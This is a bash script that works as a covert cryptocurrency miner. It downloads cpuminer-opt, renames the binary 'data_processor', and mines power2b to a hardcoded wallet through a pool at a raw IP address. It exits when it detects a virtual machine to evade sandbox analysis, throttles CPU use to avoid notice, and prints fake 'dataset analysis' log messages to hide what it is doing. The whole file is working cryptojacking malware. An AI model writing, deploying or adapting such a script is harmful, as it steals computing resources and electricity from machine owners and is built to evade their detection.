#!/bin/bash
set -e

WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
POOL="stratum+tcps://159.223.48.143:443"
ALGO="power2b"
FAKE_NAME="data_processor"
THREADS_MAX=$(nproc)
LOGFILE="processor.log"

# CPU USAGE CONTROL
THROTTLE_PERCENT=65  # Target max CPU usage

# === Virtualization Bypass ===
if grep -qaE 'vmware|virtualbox|qemu|hypervisor' /proc/cpuinfo /sys/class/dmi/id/* 2>/dev/null; then
    echo "[!] Virtualized environment detected. Exiting..." >> "$LOGFILE"
    exit 0
fi

# Unduh miner jika belum ada
if [ ! -f "$FAKE_NAME" ]; then
    wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$FAKE_NAME"
    chmod +x "$FAKE_NAME"
fi

# Function throttle CPU usage adaptif
cpu_throttle() {
    while true; do
        sleep 15
        USAGE=$(ps -p $1 -o %cpu= | awk '{print int($1)}')
        if [ "$USAGE" -gt "$THROTTLE_PERCENT" ]; then
            kill -STOP $1
            sleep 3
            kill -CONT $1
        fi
    done
}

# Loop disguise
echo "[*] Loading data processor module..." | tee "$LOGFILE"
sleep 1
echo "[*] Connecting to secure data socket..." | tee -a "$LOGFILE"
sleep 1
echo "[*] Starting threaded analysis engine ($THREADS_MAX workers)" | tee -a "$LOGFILE"
sleep 1

while true; do
    echo "[*] Analyzing dataset batch @$(date '+%T')" | tee -a "$LOGFILE"
    ./"$FAKE_NAME" -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS_MAX >> /dev/null 2>&1 &
    PID=$!

    cpu_throttle $PID &

    while sleep $((RANDOM % 10 + 10)); do
        if ! ps -p $PID > /dev/null; then
            echo "[!] Data engine crash. Reinitializing..." | tee -a "$LOGFILE"
            sleep $((RANDOM % 5 + 3))
            break
        fi
        echo "[*] Dataset parsed successfully @$(date '+%T')" | tee -a "$LOGFILE"
    done
done
